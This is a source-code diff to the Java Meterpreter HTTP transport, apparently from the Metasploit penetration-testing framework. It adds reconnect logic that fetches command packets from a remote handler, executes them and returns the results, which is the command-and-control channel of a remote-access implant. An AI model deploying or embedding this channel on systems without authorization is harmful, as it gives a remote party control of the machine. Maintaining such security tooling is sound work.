@@ -67,10 +67,42 @@ public class HttpTransport extends Transport {
     }
 
     protected boolean tryConnect(Meterpreter met) throws IOException {
-        // given that we don't have a persistent connection, we just assume
-        // that we "can" connect, and handle the failures when dealing with
-        // the packet handling
-        return true;
+        System.out.println("msf : attempting to read packet on reconnect");
+        URLConnection conn = this.createConnection();
+
+        if (conn == null) {
+            return false;
+        }
+
+        OutputStream outputStream = conn.getOutputStream();
+        outputStream.write(RECV);
+        outputStream.close();
+
+        DataInputStream inputStream = new DataInputStream(conn.getInputStream());
+
+        try {
+            int len = inputStream.readInt();
+            int type = inputStream.readInt();
+            TLVPacket request = new TLVPacket(inputStream, len - 8);
+            inputStream.close();
+
+            // things are looking good, handle the packet and return true, as this
+            // is the situation that happens on initial connect (not reconnect)
+            TLVPacket response = request.createResponse();
+            int result = met.getCommandManager().executeCommand(met, request, response);
+            this.writePacket(response, TLVPacket.PACKET_TYPE_RESPONSE);
+
+            return true;
+        }
+        catch (EOFException ex) {
+            // this can happens on reconnect
+            return true;
+        }
+        catch (Exception ex) {
+        }
+
+        // we get here, thins aren't good.
+        return false;
     }
 
     public TLVPacket readPacket() throws IOException {
@@ -131,7 +163,7 @@ public class HttpTransport extends Transport {
         }
     }
 
-    public boolean dispatch(Meterpreter met, CommandManager commandManager) {
+    public boolean dispatch(Meterpreter met) {
         System.out.println("msf : In the dispatch loop");
         long lastPacket = System.currentTimeMillis();
         long ecount = 0;
@@ -150,7 +182,7 @@ public class HttpTransport extends Transport {
                     lastPacket = System.currentTimeMillis();
 
                     TLVPacket response = request.createResponse();
-                    int result = commandManager.executeCommand(met, request, response);
+                    int result = met.getCommandManager().executeCommand(met, request, response);
 
                     this.writePacket(response, TLVPacket.PACKET_TYPE_RESPONSE);
 
